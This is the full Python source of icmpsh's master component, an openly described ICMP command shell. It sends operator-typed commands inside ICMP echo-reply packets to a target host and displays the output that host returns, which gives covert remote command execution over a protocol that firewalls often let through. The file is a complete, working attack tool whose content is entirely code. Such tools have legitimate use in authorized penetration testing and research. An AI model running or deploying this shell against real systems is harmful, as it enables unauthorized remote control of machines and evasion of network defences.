#!/usr/bin/env python
#
#  icmpsh - simple icmp command shell (port of icmpsh-m.pl written in
#  Perl by Nico Leidecker <nico@leidecker.info>)
#
#  Copyright (c) 2010, Bernardo Damele A. G. <bernardo.damele@gmail.com>
#
#
#  This program is free software: you can redistribute it and/or modify
#  it under the terms of the GNU General Public License as published by
#  the Free Software Foundation, either version 3 of the License, or
#  (at your option) any later version.
#
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.
#
#  You should have received a copy of the GNU General Public License
#  along with this program.  If not, see <http://www.gnu.org/licenses/>.

import fcntl
import os
import select
import socket
import sys

try:
    from impacket import ImpactDecoder
    from impacket import ImpactPacket
except ImportError, _:
    pass

def main(src, dst):
    # Make standard input a non-blocking file
    fd = sys.stdin.fileno()
    fl = fcntl.fcntl(fd, fcntl.F_GETFL)
    fcntl.fcntl(fd, fcntl.F_SETFL, fl | os.O_NONBLOCK)

    # Open one socket for ICMP protocol
    # A special option is set on the socket so that IP headers are included
    # with the returned data
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    except socket.error, e:
        print 'You need to run icmpsh master with administrator privileges'
        sys.exit(1)

    sock.setblocking(0)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

    # Create a new IP packet and set its source and destination addresses
    ip = ImpactPacket.IP()
    ip.set_ip_src(src)
    ip.set_ip_dst(dst)

    # Create a new ICMP packet of type ECHO REPLY
    icmp = ImpactPacket.ICMP()
    icmp.set_icmp_type(icmp.ICMP_ECHOREPLY)

    # Instantiate an IP packets decoder
    decoder = ImpactDecoder.IPDecoder()

    while 1:
        cmd = ''

        # Wait for incoming replies
        if sock in select.select([ sock ], [], [])[0]:
            buff = sock.recv(4096)

            if 0 == len(buff):
                # Socket remotely closed
                sock.close()
                sys.exit(0)

            # Packet received; decode and display it
            ippacket = decoder.decode(buff)
            icmppacket = ippacket.child()

            # If the packet matches, report it to the user
            if ippacket.get_ip_dst() == src and ippacket.get_ip_src() == dst and 8 == icmppacket.get_icmp_type():
                # Get identifier and sequence number
                ident = icmppacket.get_icmp_id()
                seq_id = icmppacket.get_icmp_seq()
                data = icmppacket.get_data_as_string()

                if len(data) > 0:
                    sys.stdout.write(data)

                # Parse command from standard input
                try:
                    cmd = sys.stdin.readline()
                except:
                    pass

                if cmd == 'exit':
                    return

                # Set sequence number and identifier
                icmp.set_icmp_id(ident)
                icmp.set_icmp_seq(seq_id)

                # Include the command as data inside the ICMP packet
                icmp.contains(ImpactPacket.Data(cmd))

                # Calculate its checksum
                icmp.set_icmp_cksum(0)
                icmp.auto_checksum = 1

                # Have the IP packet contain the ICMP packet (along with its payload)
                ip.contains(icmp)

                # Send it to the target host
                sock.sendto(ip.get_packet(), (dst, 0))

if __name__ == '__main__':
    if len(sys.argv) < 3:
        print 'missing mandatory options. Execute as root:'
        print './icmpsh-m.py <source IP address> <destination IP address>'
        sys.exit(1)

    main(sys.argv[1], sys.argv[2])
